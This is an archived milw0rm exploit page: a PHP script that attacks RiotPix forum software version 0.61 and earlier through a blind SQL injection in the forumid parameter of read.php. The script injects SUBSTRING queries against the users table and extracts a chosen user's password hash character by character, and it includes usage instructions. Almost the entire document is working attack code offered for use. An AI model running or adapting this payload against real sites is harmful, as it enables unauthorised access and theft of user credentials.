<html><head><title>RiotPix <= 0.61 (forumid) Blind SQL Injection Exploit</title></head><pre>&lt;?php

/*

	$Id: riotpix-0.61.txt,v 0.1 2009/01/06 03:47:30 cOndemned Exp $

	RiotPix &lt;= 0.61 (forumid) Blind SQL Injection Exploit
	Bug found &amp;&amp; Exploited by cOndemned

	Download :
		
		http://www.riotpix.com/download/riotpix0_61.zip


	Description :
		
		It's just simple Blind SQL Injection exploit that gets
		password hash of given user. Code is really simple - 
		without proxy, or error handling, but i don't think it is
		important, as long as the RiotPix isn't famous script...
		
	-------------------------------------------------------------------	

	Greetz: 
	
		ZaBeaTy, str0ke, sid.psycho &amp; TWT, wojtus0007, 0in, vCore


		&quot;...What is left to die for, what is left to give...&quot;

*/


	echo &quot;\n[~] RiotPix &lt;= 0.61 (forumid) Blind SQL Injection Exploit&quot;;
	echo &quot;\n[~] Bug found &amp;&amp; Exploited by cOndemned\n&quot;;

	if($argc != 4)
	{
		printf(&quot;[!] Usage: php %s &lt;target_size&gt; &lt;username&gt; &lt;topic_id&gt;\n\n&quot;, $argv[0]);
		exit;
	}

	list($sploit, $target, $username, $topicid) = $argv;

	$charsArr = array(48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102);
	$pos = 1;

	echo &quot;[~] Password Hash : &quot;;

	while($pos != 33)
	{
		for($i = 0; $i &lt;= count($charsArr); $i++)
		{
			$query = &quot;/read.php?forumid=$topicid+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='$username'),$pos,1)=CHAR({$charsArr[$i]})--&quot;;
			$source = file_get_contents($target . $query);
			
			if(!eregi('existent', $source))  
			{
				printf(&quot;%s&quot;, chr($charsArr[$i]));
				$pos++;
				break;
			}
			flush(STDOUT);
		}
	}

	echo &quot;\n[~] Done\n\n&quot;;

?&gt;

# milw0rm.com [2009-01-06]</pre></html>